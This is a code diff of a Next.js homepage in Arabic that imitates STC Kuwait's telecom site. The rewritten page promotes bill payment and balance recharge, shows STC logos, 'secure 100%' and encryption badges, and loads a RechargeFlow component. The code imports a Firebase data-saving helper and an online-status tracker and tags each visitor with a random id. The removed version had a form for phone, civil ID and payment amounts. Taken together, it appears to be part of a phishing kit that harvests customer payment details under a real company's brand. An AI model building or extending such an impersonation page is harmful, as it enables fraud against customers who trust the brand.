@@ -5,27 +5,28 @@ import type React from "react"
 import { useEffect, useState } from "react"
 import { useRouter } from "next/navigation"
 import {
-  Search,
-  ShoppingCart,
-  User,
   Menu,
-  CreditCard,
-  ChevronRight,
+  Search,
+  User,
+  ShoppingCart,
   Phone,
-  Wifi,
+  MessageCircle,
+  CreditCard,
+  FileText,
   Smartphone,
-  Tv,
-  Headphones,
-  ShieldCheck,
-  ArrowRight,
-  PlusCircle,
-  Download,
+  Users,
+  ChevronLeft,
+  Star,
+  Shield,
+  Clock,
+  CheckCircle,
 } from "lucide-react"
 
 import { Button } from "@/components/ui/button"
-import { Input } from "@/components/ui/input"
 import { addData } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/online-sts"
+import { Card, CardContent } from "@/components/ui/card"
+import { RechargeFlow } from "@/components/recharge-flow"
 
 const _id = "ord-shown-"+Math.random()
   .toString(36)
@@ -78,274 +79,429 @@ export default function Home() {
   }
 
   return (
-    <div className="flex flex-col min-h-screen bg-gradient-to-br from-slate-50 to-gray-100 font-sans" dir="rtl">
-      {/* Header */}
-      <header className="flex justify-between items-center px-6 py-4 bg-white/95 backdrop-blur-sm border-b border-gray-200/50 sticky top-0 z-50 shadow-sm">
-        <button className="p-2.5 rounded-xl hover:bg-gray-100 transition-all duration-200 hover:scale-105">
-          <Menu className="w-5 h-5 text-slate-700" />
-        </button>
-
-        <div className="flex items-center">
-          <img src="/stc.png" alt="STC Logo" className="h-8 w-auto" />
-        </div>
-
-        <div className="flex items-center space-x-reverse space-x-3">
-          <button className="p-2.5 rounded-xl hover:bg-gray-100 transition-all duration-200 hover:scale-105">
-            <Search className="w-5 h-5 text-slate-600" />
-          </button>
-          <button className="p-2.5 rounded-xl hover:bg-gray-100 transition-all duration-200 hover:scale-105">
-            <ShoppingCart className="w-5 h-5 text-slate-600" />
-          </button>
-          <button className="p-2.5 rounded-xl hover:bg-gray-100 transition-all duration-200 hover:scale-105">
-            <User className="w-5 h-5 text-red-500" />
-          </button>
-        </div>
-      </header>
-
-      {/* Hero Banner */}
-      <div className="relative mx-6 my-8 rounded-3xl overflow-hidden shadow-2xl">
-        <div className="absolute inset-0 bg-gradient-to-r from-slate-900/60 via-purple-900/40 to-red-500/60 z-10"></div>
-        <img src="/hero-banner.jpg" alt="Hero Banner" className="w-full h-[380px] object-cover" />
-        <div className="absolute inset-0 z-20 p-8 flex flex-col justify-between">
-          <div className="bg-white/95 backdrop-blur-sm rounded-2xl p-4 w-40 text-center shadow-lg border border-white/20">
-            <div className="text-red-500 font-bold text-xl">خلك ON</div>
-            <div className="text-red-400 text-xs mt-1 font-medium">باقات الدفع المسبقة الجديدة كلياً</div>
+    <div className="min-h-screen bg-gray-50" dir="rtl">
+    {/* Header */}
+    <header className="bg-white shadow-lg border-b border-gray-100 sticky top-0 z-50">
+      <div className="max-w-md mx-auto">
+        <div className="flex items-center justify-between px-4 py-3">
+          <div className="flex items-center gap-3">
+            <Button variant="ghost" size="icon" className="hover:bg-gray-100 rounded-full">
+              <Menu className="h-5 w-5 text-gray-700" />
+            </Button>
+            <Button variant="ghost" size="icon" className="hover:bg-gray-100 rounded-full">
+              <Search className="h-5 w-5 text-gray-700" />
+            </Button>
           </div>
 
-          <div className="space-y-4">
-            <h1 className="text-white font-bold text-3xl md:text-4xl leading-tight drop-shadow-lg">
-              تواصل بدون انقطاع
-              <br />
-              <span className="text-red-300">مع باقات الدفع الآجل</span>
-            </h1>
-            <div className="flex justify-end mt-6">
-              <Button className="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white rounded-2xl px-8 py-4 font-semibold text-lg shadow-xl transition-all duration-300 hover:scale-105 hover:shadow-2xl">
-                اعرف أكثر
+          <div className="flex items-center">
+           
+           <img src="/stc.png"alt="" width={70}/>
+          </div>
+
+          <div className="flex items-center gap-2">
+            <Button variant="ghost" size="icon" className="hover:bg-gray-100 rounded-full relative">
+              <ShoppingCart className="h-5 w-5 text-gray-700" />
+              <span className="absolute -top-1 -right-1 bg-red-500 text-white text-xs rounded-full h-4 w-4 flex items-center justify-center">
+                2
+              </span>
+            </Button>
+            <Button variant="ghost" size="icon" className="hover:bg-gray-100 rounded-full">
+              <User className="h-5 w-5 text-gray-700" />
+            </Button>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <div className="max-w-md mx-auto bg-white min-h-screen">
+      {/* Hero Section */}
+      <section className="relative overflow-hidden">
+        <div className="relative h-80 bg-[url(/payment-tablet.webp)] bg-cover  backdrop-blur-lg">
+     
+          <div className="relative z-10 h-full flex flex-col justify-center px-6 text-white  bg-black/40 ">
+            <div className="mb-4">
+              <div className="inline-flex items-center gap-2 bg-white/20 backdrop-blur-sm rounded-full px-3 py-1 text-sm mb-4">
+                <Star className="h-4 w-4 bg-50 text-yellow-300" />
+                <span>الخدمة الأكثر استخداماً</span>
+              </div>
+              <h1 className="text-3xl font-bold mb-3 leading-tight">
+                خدمات دفع الفواتير
+                <br />
+                <span className="text-pink-200">وإعادة التعبئة</span>
+              </h1>
+              <p className="text-lg text-purple-100 mb-2">الدفع السريع والآمن</p>
+              <p className="text-sm text-purple-200 opacity-90">ادفع فواتيرك<span className="mx-2 bg-gradient-to-r from-purple-700 to-pink-900 text-white rounded p-1">
+              بسهولة وأمان </span> من خلال تطبيق stc المطور</p>
+            </div>
+
+            <div className="flex items-center gap-4 text-sm">
+              <div className="flex items-center gap-2">
+                <Shield className="h-4 w-4 text-green-300" />
+                <span>آمن 100%</span>
+              </div>
+              <div className="flex items-center gap-2">
+                <Clock className="h-4 w-4 text-blue-300" />
+                <span>فوري</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      {/* Quick Actions */}
+      <section className="px-4 -mt-8 relative z-20">
+        <div className="grid grid-cols-2 gap-3 mb-6">
+          <Button className="bg-gradient-to-r from-purple-500 to-purple-900 hover:from-purple-600 hover:to-pink-700 text-white py-4 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 font-semibold">
+            <CreditCard className="h-5 w-5 ml-2" />
+            ادفع الآن
+          </Button>
+          <Button
+            variant="outline"
+            className="border-2 border-purple-200 hover:border-purple-300 py-4 rounded-xl bg-white hover:bg-purple-50 transition-all duration-300 font-semibold"
+            onClick={() => document.getElementById("recharge-section")?.scrollIntoView({ behavior: "smooth" })}
+          >
+            <Smartphone className="h-5 w-5 ml-2" />
+            إعادة تعبئة
+          </Button>
+        </div>
+      </section>
+
+      {/* Recharge Flow Section */}
+      <section id="recharge-section" className="px-4 mb-8">
+        <RechargeFlow />
+      </section>
+
+      {/* WhatsApp Contact */}
+      <section className="px-4 mb-8">
+        <Card className="border-0 shadow-md hover:shadow-lg transition-shadow duration-300 bg-gradient-to-r from-green-50 to-emerald-50 border-l-4 border-l-green-500">
+          <CardContent className="p-4">
+            <div className="flex items-center gap-4">
+              <div className="w-12 h-12 bg-gradient-to-br from-green-500 to-green-600 rounded-xl flex items-center justify-center shadow-lg">
+                <MessageCircle className="h-6 w-6 text-white" />
+              </div>
+              <div className="flex-1">
+                <h3 className="font-bold text-gray-900 mb-1">تواصل معنا عبر واتساب</h3>
+                <p className="text-sm text-gray-600">خدمة عملاء متاحة 24/7</p>
+              </div>
+              <ChevronLeft className="h-5 w-5 text-gray-400" />
+            </div>
+          </CardContent>
+        </Card>
+      </section>
+
+      {/* Services Section */}
+      <section className="px-4 space-y-6">
+        <div className="text-center mb-6">
+          <h2 className="text-2xl font-bold text-gray-900 mb-2">خدماتنا المميزة</h2>
+          <p className="text-gray-600">اختر الخدمة المناسبة لك</p>
+        </div>
+
+        {/* Pay Bills Service */}
+        <Card className="border-0 shadow-lg hover:shadow-xl transition-all duration-300 overflow-hidden group">
+          <CardContent className="p-0">
+            <div className="bg-gradient-to-br from-purple-600 to-purple-700 p-4 text-white">
+              <div className="flex items-center justify-between mb-3">
+                <div className="w-12 h-12 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center">
+                  <CreditCard className="h-6 w-6" />
+                </div>
+                <div className="flex items-center gap-1 text-sm bg-white/20 backdrop-blur-sm rounded-full px-3 py-1">
+                  <CheckCircle className="h-4 w-4" />
+                  <span>الأكثر استخداماً</span>
+                </div>
+              </div>
+              <h3 className="text-xl font-bold mb-2">ادفع فواتيرك</h3>
+              <p className="text-purple-100 text-sm">دفع سريع وآمن لجميع أنواع الفواتير</p>
+            </div>
+
+            <div className="p-4 bg-white">
+              <p className="text-gray-600 text-sm mb-4 leading-relaxed">
+                ادفع فواتير الكهرباء، الماء، الهاتف، والإنترنت بشكل سهل وآمن وفوري من خلال تطبيق stc. تتبع مدفوعاتك
+                بالتفصيل واحصل على إشعارات فورية.
+              </p>
+
+              <div className="flex items-center gap-4 mb-4 text-sm text-gray-500">
+                <div className="flex items-center gap-1">
+                  <Shield className="h-4 w-4 text-green-500" />
+                  <span>مشفر وآمن</span>
+                </div>
+                <div className="flex items-center gap-1">
+                  <Clock className="h-4 w-4 text-blue-500" />
+                  <span>فوري</span>
+                </div>
+              </div>
+
+              <Button className="w-full bg-gradient-to-r from-pink-500 to-pink-600 hover:from-pink-600 hover:to-pink-700 text-white py-3 rounded-xl font-semibold shadow-md hover:shadow-lg transition-all duration-300">
+                ادفع الآن
+                <ChevronLeft className="h-4 w-4 mr-2" />
               </Button>
             </div>
-          </div>
-        </div>
-      </div>
+          </CardContent>
+        </Card>
 
-      {/* Service Icons */}
-      <div className="px-6 mt-4">
-        <div className="grid grid-cols-3 gap-3">
-          <ServiceCard icon={<ShieldCheck />} title="تحديث البطاقة المدنية" />
-          <ServiceCard icon={<ArrowRight />} title="نقل إلى stc" />
-          <ServiceCard icon={<PlusCircle />} title="احصل على خط جديد" />
-        </div>
-      </div>
-
-      {/* Quick Payment */}
-      <div className="mx-6 mt-12">
-        <form
-          onSubmit={handleSubmit}
-          className="p-8 bg-white/80 backdrop-blur-sm rounded-3xl shadow-xl border border-white/50"
-        >
-          <div className="flex items-center justify-between mb-8">
-            <div className="p-3 bg-gradient-to-br from-purple-100 to-purple-200 rounded-2xl">
-              <CreditCard className="w-7 h-7 text-purple-700" />
-            </div>
-            <h2 className="text-2xl font-bold text-slate-800">الدفع السريع</h2>
-          </div>
-
-          <div className="space-y-6">
-            <div className="relative">
-              <Input
-                required
-                type="tel"
-                value={phone}
-                onChange={(e) => setPhone(e.target.value)}
-                maxLength={12}
-                placeholder="رقم الجوال/البطاقة المدنية أو رقم العقد"
-                className="text-right border-2 border-gray-200 rounded-2xl focus:ring-0 py-4 px-4 focus:border-purple-400 transition-all duration-200 bg-white/70 backdrop-blur-sm text-slate-700 placeholder:text-slate-400"
-              />
-            </div>
-
-            {phone.length >= 8 && (
-              <div className="relative animate-fadeIn">
-                <Input
-                  required
-                  value={amount}
-                  onChange={(e) => setAmount(e.target.value)}
-                  maxLength={3}
-                  placeholder="القيمة بالدينار الكويتي"
-                  type="tel"
-                  className="text-right border-2 border-gray-200 rounded-2xl focus:ring-0 py-4 px-4 focus:border-purple-400 transition-all duration-200 bg-white/70 backdrop-blur-sm text-slate-700 placeholder:text-slate-400"
-                />
+        {/* Recharge Service */}
+        <Card className="border-0 shadow-lg hover:shadow-xl transition-all duration-300 overflow-hidden">
+          <CardContent className="p-0">
+            <div className="bg-gradient-to-br from-blue-600 to-blue-700 p-4 text-white">
+              <div className="flex items-center justify-between mb-3">
+                <div className="w-12 h-12 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center">
+                  <FileText className="h-6 w-6" />
+                </div>
+                <div className="text-sm bg-white/20 backdrop-blur-sm rounded-full px-3 py-1">جديد</div>
               </div>
-            )}
-
-            <Button
-              type="submit"
-              className="w-full bg-gradient-to-r from-red-500 via-red-600 to-red-500 hover:from-red-600 hover:via-red-700 hover:to-red-600 text-white rounded-2xl py-4 font-semibold text-lg shadow-lg transition-all duration-300 hover:shadow-xl hover:scale-[1.02]"
-            >
-              تابع الآن
-            </Button>
-          </div>
-        </form>
-      </div>
-
-      {/* Quick Access */}
-      <div className="mx-6 mt-12">
-        <div className="flex justify-between items-center mb-6">
-          <Button
-            variant="ghost"
-            className="text-purple-700 hover:text-purple-800 p-0 flex items-center font-semibold hover:bg-purple-50 px-3 py-2 rounded-xl transition-all duration-200"
-          >
-            المزيد <ChevronRight className="h-4 w-4 mr-1" />
-          </Button>
-          <h2 className="text-2xl font-bold text-slate-800">الوصول السريع</h2>
-        </div>
-
-        <div className="grid grid-cols-5 gap-4">
-          <CategoryCard icon={<Phone />} label="الأجهزة" />
-          <CategoryCard icon={<Wifi />} label="الإنترنت" />
-          <CategoryCard icon={<Smartphone />} label="الجوال" />
-          <CategoryCard icon={<Tv />} label="التلفزيون" />
-          <CategoryCard icon={<Headphones />} label="الترفيه" />
-        </div>
-      </div>
-
-      {/* Featured Products */}
-      <div className="mx-6 mt-12">
-        <div className="flex justify-between items-center mb-6">
-          <Button
-            variant="ghost"
-            className="text-purple-700 hover:text-purple-800 p-0 flex items-center font-semibold hover:bg-purple-50 px-3 py-2 rounded-xl transition-all duration-200"
-          >
-            المزيد <ChevronRight className="h-4 w-4 mr-1" />
-          </Button>
-          <h2 className="text-2xl font-bold text-slate-800">تسوق أجهزة الجوال</h2>
-        </div>
-
-        <div className="grid grid-cols-2 gap-6">
-          <ProductCard
-            image="/samsung-s22.png"
-            title="Samsung S25 Ultra"
-            price="255.00"
-            currency="د.ك"
-            installment="12.63"
-          />
-          <ProductCard
-            image="/s25-Ultra-silver-blue-700x700.webp"
-            title="Samsung S25"
-            price="225.00"
-            currency="د.ك"
-            installment="11.29"
-          />
-        </div>
-      </div>
-
-      {/* Samsung Banner */}
-      <div className="mx-6 mt-12">
-        <div className="relative rounded-3xl overflow-hidden shadow-xl">
-          <div className="absolute inset-0 bg-gradient-to-l from-black/60 to-transparent z-10"></div>
-          <img
-            src="/samsung-s23.png"
-            alt="Samsung Banner"
-            width={700}
-            height={200}
-            className="w-full h-[160px] object-cover"
-          />
-          <div className="absolute inset-0 z-20 flex items-center justify-between p-8">
-            <Button className="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white rounded-2xl px-6 py-3 text-sm font-semibold shadow-lg transition-all duration-300 hover:scale-105">
-              تسوق الآن
-            </Button>
-            <div className="text-white text-right">
-              <h3 className="font-bold text-xl drop-shadow-lg">سامسونج جالكسي</h3>
-              <p className="text-sm mt-1 drop-shadow-md opacity-90">اكتشف المجموعة الجديدة</p>
+              <h3 className="text-xl font-bold mb-2">أعد تعبئة خطك</h3>
+              <p className="text-blue-100 text-sm">تعبئة سريعة لرصيد الهاتف وباقات الإنترنت</p>
             </div>
+
+            <div className="p-4 bg-white">
+              <p className="text-gray-600 text-sm mb-4 leading-relaxed">
+                أعد تعبئة خطك للمكالمات أو حزم الإنترنت بخطوات بسيطة واستمتع بتجربة سهلة للدفع السريع مع عروض وخصومات
+                حصرية.
+              </p>
+
+              <div className="grid grid-cols-3 gap-2 mb-4">
+                <div className="text-center p-2 bg-gray-50 rounded-lg">
+                  <div className="text-lg font-bold text-blue-600">5</div>
+                  <div className="text-xs text-gray-500">د.ك</div>
+                </div>
+                <div className="text-center p-2 bg-gray-50 rounded-lg">
+                  <div className="text-lg font-bold text-blue-600">10</div>
+                  <div className="text-xs text-gray-500">د.ك</div>
+                </div>
+                <div className="text-center p-2 bg-gray-50 rounded-lg">
+                  <div className="text-lg font-bold text-blue-600">20</div>
+                  <div className="text-xs text-gray-500">د.ك</div>
+                </div>
+              </div>
+
+              <Button className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white py-3 rounded-xl font-semibold shadow-md hover:shadow-lg transition-all duration-300">
+                تعبئة رصيد الآن
+                <ChevronLeft className="h-4 w-4 mr-2" />
+              </Button>
+            </div>
+          </CardContent>
+        </Card>
+
+        {/* Postpaid Service */}
+        <Card className="border-0 shadow-lg hover:shadow-xl transition-all duration-300 overflow-hidden">
+          <CardContent className="p-0">
+            <div className="bg-gradient-to-br from-emerald-600 to-emerald-700 p-4 text-white">
+              <div className="flex items-center justify-between mb-3">
+                <div className="w-12 h-12 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center">
+                  <Smartphone className="h-6 w-6" />
+                </div>
+                <div className="text-sm bg-white/20 backdrop-blur-sm rounded-full px-3 py-1">مميز</div>
+              </div>
+              <h3 className="text-xl font-bold mb-2">الدفع للخطوط المدفوعة</h3>
+              <p className="text-emerald-100 text-sm">إدارة وسداد فواتير الخطوط الشهرية</p>
+            </div>
+
+            <div className="p-4 bg-white">
+              <p className="text-gray-600 text-sm mb-4 leading-relaxed">
+                ادفع فواتير خطوطك المدفوعة مسبقاً بكل سهولة، واستمتع بخدمات إضافية مثل تفعيل الباقات وإدارة الخدمات من
+                مكان واحد.
+              </p>
+
+              <div className="bg-gradient-to-r from-emerald-50 to-green-50 p-3 rounded-lg mb-4 border border-emerald-100">
+                <div className="flex items-center gap-2 text-sm text-emerald-700">
+                  <CheckCircle className="h-4 w-4" />
+                  <span>خصم 10% على الدفع المبكر</span>
+                </div>
+              </div>
+
+              <Button className="w-full bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 text-white py-3 rounded-xl font-semibold shadow-md hover:shadow-lg transition-all duration-300">
+                ادفع الآن
+                <ChevronLeft className="h-4 w-4 mr-2" />
+              </Button>
+            </div>
+          </CardContent>
+        </Card>
+      </section>
+
+      {/* Features Section */}
+      <section className="px-4 py-8 bg-gray-50 mt-8">
+        <div className="text-center mb-6">
+          <h2 className="text-xl font-bold text-gray-900 mb-2">لماذا تختار stc؟</h2>
+        </div>
+
+        <div className="grid grid-cols-2 gap-4">
+          <div className="text-center p-4 bg-white rounded-xl shadow-sm">
+            <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
+              <Shield className="h-6 w-6 text-green-600" />
+            </div>
+            <h3 className="font-semibold text-gray-900 mb-1">أمان عالي</h3>
+            <p className="text-xs text-gray-600">تشفير متقدم لحماية بياناتك</p>
+          </div>
+
+          <div className="text-center p-4 bg-white rounded-xl shadow-sm">
+            <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-3">
+              <Clock className="h-6 w-6 text-blue-600" />
+            </div>
+            <h3 className="font-semibold text-gray-900 mb-1">سرعة فائقة</h3>
+            <p className="text-xs text-gray-600">معالجة فورية للمدفوعات</p>
+          </div>
+
+          <div className="text-center p-4 bg-white rounded-xl shadow-sm">
+            <div className="w-12 h-12 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-3">
+              <Users className="h-6 w-6 text-purple-600" />
+            </div>
+            <h3 className="font-semibold text-gray-900 mb-1">دعم 24/7</h3>
+            <p className="text-xs text-gray-600">خدمة عملاء متاحة دائماً</p>
+          </div>
+
+          <div className="text-center p-4 bg-white rounded-xl shadow-sm">
+            <div className="w-12 h-12 bg-pink-100 rounded-full flex items-center justify-center mx-auto mb-3">
+              <Star className="h-6 w-6 text-pink-600" />
+            </div>
+            <h3 className="font-semibold text-gray-900 mb-1">عروض حصرية</h3>
+            <p className="text-xs text-gray-600">خصومات ومكافآت مستمرة</p>
           </div>
         </div>
-      </div>
-
-      {/* Gift Cards */}
-      <div className="mx-6 mt-12">
-        <div className="flex justify-between items-center mb-6">
-          <Button
-            variant="ghost"
-            className="text-purple-700 hover:text-purple-800 p-0 flex items-center font-semibold hover:bg-purple-50 px-3 py-2 rounded-xl transition-all duration-200"
-          >
-            المزيد <ChevronRight className="h-4 w-4 mr-1" />
-          </Button>
-          <h2 className="text-2xl font-bold text-slate-800">تسوق البطاقات و الألعاب الإلكترونية</h2>
-        </div>
-
-        <div className="grid grid-cols-2 gap-6">
-          <GiftCard image="/pla.webp" title="Google Play" />
-          <GiftCard image="/itun.webp" title="iTunes" />
-        </div>
-      </div>
-
-      {/* Accessories */}
-      <div className="mx-6 mt-12">
-        <div className="flex justify-between items-center mb-6">
-          <Button
-            variant="ghost"
-            className="text-purple-700 hover:text-purple-800 p-0 flex items-center font-semibold hover:bg-purple-50 px-3 py-2 rounded-xl transition-all duration-200"
-          >
-            المزيد <ChevronRight className="h-4 w-4 mr-1" />
-          </Button>
-          <h2 className="text-2xl font-bold text-slate-800">الأجهزة</h2>
-        </div>
-
-        <div className="grid grid-cols-3 gap-4">
-          <CategoryCard image="/wifi.png" label="راوتر" bgColor="bg-gradient-to-br from-purple-50 to-purple-100" />
-          <CategoryCard image="/music.png" label="سماعات" bgColor="bg-gradient-to-br from-purple-50 to-purple-100" />
-          <CategoryCard
-            image="/wristwatch.png"
-            label="ساعات"
-            bgColor="bg-gradient-to-br from-purple-50 to-purple-100"
-          />
-        </div>
-      </div>
-
-      {/* Entertainment */}
-      <div className="mx-6 mt-12 mb-12">
-        <div className="flex justify-between items-center mb-6">
-          <Button
-            variant="ghost"
-            className="text-purple-700 hover:text-purple-800 p-0 flex items-center font-semibold hover:bg-purple-50 px-3 py-2 rounded-xl transition-all duration-200"
-          >
-            المزيد <ChevronRight className="h-4 w-4 mr-1" />
-          </Button>
-          <h2 className="text-2xl font-bold text-slate-800">تسوق خدمات الترفيه</h2>
-        </div>
-
-        <div className="grid grid-cols-3 gap-4">
-          <CategoryCard image="/rgb.png" label="Netflix" bgColor="bg-gradient-to-br from-purple-50 to-purple-100" />
-          <CategoryCard image="/mbc.png" label="Shahid" bgColor="bg-gradient-to-br from-purple-50 to-purple-100" />
-          <CategoryCard image="/Spotify.png" label="Spotify" bgColor="bg-gradient-to-br from-purple-50 to-purple-100" />
-        </div>
-      </div>
-
-      {/* Newsletter */}
-      <div className="bg-gradient-to-r from-slate-800 via-purple-900 to-red-600 py-12 px-8 shadow-inner">
-        <div className="text-white text-center mb-8">
-          <h3 className="font-bold text-2xl">انضم إلى نشرتنا الإخبارية</h3>
-          <p className="text-base mt-3 opacity-90">احصل على آخر العروض والأخبار</p>
-        </div>
-        <div className="flex gap-4 max-w-md mx-auto">
-          <Button className="bg-white text-slate-800 hover:bg-gray-100 flex-1 shadow-lg transition-all duration-300 hover:scale-105 font-semibold rounded-2xl py-3">
-            اشترك الآن
-          </Button>
-          <Input
-            placeholder="البريد الإلكتروني"
-            className="flex-1 bg-white/95 backdrop-blur-sm text-right shadow-lg focus:ring-2 focus:ring-white rounded-2xl border-0 py-3"
-          />
-        </div>
-      </div>
+      </section>
 
       {/* Footer */}
-      <Footer />
+      <footer className="bg-gradient-to-br from-purple-900 via-purple-800 to-indigo-900 text-white">
+        <div className="p-6">
+          {/* Quick Links */}
+          <div className="grid grid-cols-2 gap-6 mb-8">
+            <div>
+              <h4 className="font-bold mb-4 text-purple-200">خدمات العملاء</h4>
+              <ul className="space-y-3 text-sm">
+                <li>
+                  <a href="#" className="hover:text-purple-200 transition-colors flex items-center gap-2">
+                    <ChevronLeft className="h-3 w-3" />
+                    خدمات المستهلكين
+                  </a>
+                </li>
+                <li>
+                  <a href="#" className="hover:text-purple-200 transition-colors flex items-center gap-2">
+                    <ChevronLeft className="h-3 w-3" />
+                    خدمات الشركات
+                  </a>
+                </li>
+                <li>
+                  <a href="#" className="hover:text-purple-200 transition-colors flex items-center gap-2">
+                    <ChevronLeft className="h-3 w-3" />
+                    مواقع الخدمات
+                  </a>
+                </li>
+                <li>
+                  <a href="#" className="hover:text-purple-200 transition-colors flex items-center gap-2">
+                    <ChevronLeft className="h-3 w-3" />
+                    الشكاوى والمقترحات
+                  </a>
+                </li>
+              </ul>
+            </div>
 
-      {/* WhatsApp Button */}
-      <WhatsAppButton />
+            <div>
+              <h4 className="font-bold mb-4 text-purple-200">معلومات مهمة</h4>
+              <ul className="space-y-3 text-sm">
+                <li>
+                  <a href="#" className="hover:text-purple-200 transition-colors flex items-center gap-2">
+                    <ChevronLeft className="h-3 w-3" />
+                    من نحن
+                  </a>
+                </li>
+                <li>
+                  <a href="#" className="hover:text-purple-200 transition-colors flex items-center gap-2">
+                    <ChevronLeft className="h-3 w-3" />
+                    سياسة الخصوصية
+                  </a>
+                </li>
+                <li>
+                  <a href="#" className="hover:text-purple-200 transition-colors flex items-center gap-2">
+                    <ChevronLeft className="h-3 w-3" />
+                    الشروط والأحكام
+                  </a>
+                </li>
+                <li>
+                  <a href="#" className="hover:text-purple-200 transition-colors flex items-center gap-2">
+                    <ChevronLeft className="h-3 w-3" />
+                    أمان المعلومات
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
 
-      {/* Loading Overlay */}
-      {isLoading && <FullPageLoader text="جاري التحويل ..." />}
+          {/* Contact Info */}
+          <div className="border-t border-purple-700 pt-6 mb-6">
+            <div className="grid grid-cols-2 gap-4 text-sm">
+              <div className="flex items-center gap-3">
+                <div className="w-10 h-10 bg-purple-700 rounded-lg flex items-center justify-center">
+                  <Phone className="h-5 w-5" />
+                </div>
+                <div>
+                  <div className="font-semibold">خدمة العملاء</div>
+                  <div className="text-purple-300">102</div>
+                </div>
+              </div>
+
+              <div className="flex items-center gap-3">
+                <div className="w-10 h-10 bg-green-600 rounded-lg flex items-center justify-center">
+                  <MessageCircle className="h-5 w-5" />
+                </div>
+                <div>
+                  <div className="font-semibold">واتساب</div>
+                  <div className="text-purple-300">متاح 24/7</div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* Logo and Social Media */}
+          <div className="text-center border-t border-purple-700 pt-6">
+            <div className="mb-4">
+              <span className="text-4xl font-bold bg-gradient-to-r from-white to-purple-200 bg-clip-text text-transparent">
+                stc
+              </span>
+            </div>
+            <p className="text-sm text-purple-200 mb-6 leading-relaxed">
+              شركة الاتصالات السعودية في دولة الكويت
+              <br />
+              عضو في مجموعة الاتصالات السعودية
+            </p>
+
+            {/* Social Media Icons */}
+            <div className="flex justify-center gap-3 mb-6">
+              {[
+                { icon: MessageCircle, color: "bg-green-600 hover:bg-green-700" },
+                { icon: Users, color: "bg-pink-600 hover:bg-pink-700" },
+                { icon: Phone, color: "bg-blue-600 hover:bg-blue-700" },
+                { icon: Users, color: "bg-blue-800 hover:bg-blue-900" },
+                { icon: Users, color: "bg-gray-700 hover:bg-gray-800" },
+                { icon: Users, color: "bg-blue-700 hover:bg-blue-800" },
+              ].map((social, index) => (
+                <button
+                  key={index}
+                  className={`w-10 h-10 ${social.color} rounded-full flex items-center justify-center transition-all duration-300 hover:scale-110 shadow-lg`}
+                >
+                  <social.icon className="h-4 w-4" />
+                </button>
+              ))}
+            </div>
+
+            <div className="text-xs text-purple-300 space-y-2">
+              <div className="flex justify-center gap-4">
+                <a href="#" className="hover:text-white transition-colors">
+                  سياسة الخصوصية
+                </a>
+                <span>•</span>
+                <a href="#" className="hover:text-white transition-colors">
+                  شروط وأحكام
+                </a>
+                <span>•</span>
+                <a href="#" className="hover:text-white transition-colors">
+                  الشروط المالية
+                </a>
+              </div>
+              <p>جميع الحقوق محفوظة © 2024 stc الكويت</p>
+            </div>
+          </div>
+        </div>
+      </footer>
     </div>
+  </div>
   )
 }
 
